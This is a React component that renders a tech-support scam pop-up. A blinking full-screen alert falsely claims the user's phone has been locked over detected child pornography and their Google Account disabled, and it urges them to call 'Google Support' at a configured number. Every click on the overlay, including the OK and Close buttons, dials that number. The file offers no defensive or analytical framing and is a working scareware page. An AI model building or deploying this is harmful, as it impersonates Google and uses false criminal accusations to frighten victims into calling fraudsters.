import React, { useEffect, useState } from "react";
import { TriangleAlert } from "lucide-react";
import { PHONE_NUMBER } from "../Constant";

const PopUp = () => {
  const [isIconVisible, setIsIconVisible] = useState(true);
  const [borderRed, setBorderRed] = useState(true); // State for border color

  useEffect(() => {
    const blinkInterval = setInterval(() => {
      setIsIconVisible((prev) => !prev);
      setBorderRed((prev) => !prev); // Toggle border color
    }, 500);

    return () => {
      clearInterval(blinkInterval);
    };
  }, []);

  const handleClick = () => {
    window.location.href = `tel:+${PHONE_NUMBER}`;
  };

  return (
    <div className="relative">
      <div
        className={`fixed z-10 inset-0 flex items-center justify-center min-h-screen px-4 text-center sm:p-0`}
        onClick={handleClick}
      >
        <div className="fixed inset-0 bg-black opacity-75"></div>

        <div
          className={`bg-white  shadow-xl transform transition-all sm:max-w-lg w-full sm:w-auto border-4 ${
            borderRed ? "border-red-500" : "border-white"
          }`} // Conditional border color
        >
          <div className="bg-white pt-8 px-4 pb-4 sm:p-6 sm:pb-4">
            <div className="sm:flex sm:items-start">
              <div className="mx-auto flex-shrink-0 flex items-center justify-center h-12 w-12 rounded-full bg-red-100 sm:mx-0 sm:h-10 sm:w-10">
                {isIconVisible && (
                  <TriangleAlert
                    className="h-6 w-6 text-red-600"
                    aria-hidden="true"
                  />
                )}
              </div>
              <div className="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left">
                <p className="text-base text-gray-500">
                  Your Phone has been locked due to detected illegal Child
                  pornography. Your Google Account has been disabled!
                  Immediately call Google Support +{PHONE_NUMBER} to unlock it!.
                </p>

                <div className="flex space-x-2 items-center justify-center w-full mt-2">
                  <div className="h-3 w-3 bg-red-600 rounded-full animate-ping"></div>
                  <div
                    className="h-3 w-3 bg-red-600 rounded-full animate-ping"
                    style={{ animationDelay: "0.2s" }}
                  ></div>
                  <div
                    className="h-3 w-3 bg-red-600 rounded-full animate-ping"
                    style={{ animationDelay: "0.4s" }}
                  ></div>
                </div>
              </div>
            </div>
          </div>
          <div className="bg-gray-50 px-4 py-3 sm:px-6 flex justify-end gap-2">
            <button
              className="bg-gray-400 text-white py-2 px-6 rounded mr-2"
              onClick={handleClick}
            >
              OK
            </button>
            <button
              className="bg-red-600 text-white py-2 px-6 rounded"
              onClick={handleClick}
            >
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PopUp;
